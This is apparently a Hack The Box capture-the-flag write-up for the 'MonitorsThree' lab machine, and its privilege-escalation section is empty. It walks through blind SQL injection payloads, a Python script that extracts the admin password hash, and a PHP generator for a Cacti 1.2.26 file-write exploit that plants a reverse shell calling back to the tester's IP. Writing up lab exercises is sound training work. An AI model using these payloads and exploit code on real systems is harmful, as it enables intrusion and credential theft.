This is a writeup for recently expired monitorsthree machine in Hackthebox platform.

### Part 1: Enumeration

As always lets startup with good old nmap scan:

![NMAP](/static/writeups/monitors/1.png)

SSH and HTTP with port 22 and 80 respectively are open.
lets see what website is hosted in port 80, we have to add monitorsthree.htb to machine ip in /etc/hosts:

![NMAP](/static/writeups/monitors/2.png)

I can see site called monitorsthree.htb, lets enumerate subdomain:
as i used bash script, to add wordlist to /etc/host and send request to it:

```
#!/bin/bash

DOMAIN="monitorsthree.htb"
IP="10.10.11.30"

WORDLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"


while read -r SUBDOMAIN; do
    FULLDOMAIN="${SUBDOMAIN}.${DOMAIN}"

    echo "$IP $FULLDOMAIN" >> /etc/hosts

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://$FULLDOMAIN")

    if [ "$RESPONSE" == "302" ]; then
        echo "Found: $FULLDOMAIN"
    fi

    sed -i "/$FULLDOMAIN/d" /etc/hosts

done < "$WORDLIST"

```

I found interesting subdomain called 'cacti.monitorsthree.htb', it asks for login credentials we don't have any so for now lets keep note of it.

there is a login page in monitorsthree.htb/login.php, and when using forgot password, i found sql injection in forgot_password.php by submitting:`'`:

![NMAP](/static/writeups/monitors/3.png)

### Part 2: Foothold

by submitting : `'order by 3--+`
till it gives error, from error I can see that it uses mariadb.
When I use nine column:

<span style="color: red;">
ad'union select null,null,null,null,null,null,null,null,null from dual--
</span>

it says successfully sent request code, so I know that query is returning nine column. but,no query result or anything is shown.
so, I think i got my hands on BLIND SQli which might be response based.

By submitting,

<span style="color: red;">ad'||(SELECT '' FROM table)||'</span>

it gives error and querying using

<span style="color: red;">ad'||(SELECT '' FROM users)||'</span>

gives successful output

![NMAP](/static/writeups/monitors/5.png)

now I know there is a table called users.
To enumerate user, i first used username administrator

<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'</span>

this gives error: 'Unable to process request, try again!'

![NMAP](/static/writeups/monitors/4.png)

but as when I input admin:

<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'</span>

it outputs: 'Successfully sent password reset request!'

![NMAP](/static/writeups/monitors/5.png)

so, I know there is user called admin now. Now, to enumerate password first i need to find length of the password so i can design payload accordingly.

<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'</span>

it returns successful so, password length must be 32, it means it is some kind of hash

<span style="color: red;">
ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
</span></br>
<span style="color: red;">
ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
</span>

As it returns successful message back like this, I found first and second character of hash but it is time consuming so i decided to do it with python script:

```

import requests
import time

# Target URL
url = "http://monitorsthree.htb/forgot_password.php"

# Initialize known characters of the password
known_password = ""

# List of possible characters (you may adjust as needed)
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Function to check if a guessed character is correct
def is_correct_char(position, char):
    # Construct payload
    payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"

    # Data to be sent in the POST request
    data = {
        "username": payload,
        "submit": "Send"
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data)
        # Check response to see if the guess was correct
        if "Successfully sent password reset request!" in response.text:
            return True
    except requests.exceptions.ConnectionError as e:
        print("Connection error. Retrying...")
        time.sleep(5)  # Wait for 5 seconds before retrying
        return is_correct_char(position, char)
    return False

# Loop to find each character of the password
for position in range(1, 33):  # Assuming password length is 32
    for char in characters:
        if is_correct_char(position, char):
            # Add the correct character to the known password
            known_password += char
            print(f"[+] Found character {position}: {char}")
            break
    # Delay to avoid server-side rate limiting or detection
    time.sleep(1)  # Adjust the delay as necessary

# Print the complete password when done
print(f"[+] Password: {known_password}")

```

Output:

![NMAP](/static/writeups/monitors/6.png)

I got admin user hash value from it:

By using hashid, i think it is md5 hash

![NMAP](/static/writeups/monitors/7.png)

I cracked the hash using hashcat which corresponds to: greencacti2001

![NMAP](/static/writeups/monitors/8.png)

Now, lets use these credential in login.php and 'cacti.monitorsthree.htb'. One thing i notice when opening 'cacti.monitorsthree.htb' is it is using cacti v 1.2.26 and quick research shows us vulnerability in this specific version to use Arbitrary file write to RCE.

[https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26.git]

To get shell i used this:

```

<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/shell.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php
\$ip = '10.10.14.59';
\$port = 3669;
\$sock = fsockopen(\$ip, \$port);
\$proc = proc_open('/bin/bash -i', array(0 => \$sock, 1 => \$sock, 2 => \$sock), \$pipes);
?>";

$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("shell.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat shell.xml | gzip -9 > shell.xml.gz; rm shell.xml");

?>

```

save this as shell.php and run it using `php shell.php`, it will generate file called shell.xml.gz upload it in import packages in cacti:

![NMAP](/static/writeups/monitors/9.png)

As you can see, I successfully uploaded shell.php in the machine, I can execute it by going to: `http://cacti.monitorsthree.htb/cacti/resource/shell.php`
before that open netcat listener in your machine: `nc -nvlp port`
I got shell as www-data using this method.

### Part 3: Privilege Escalation:

```

```
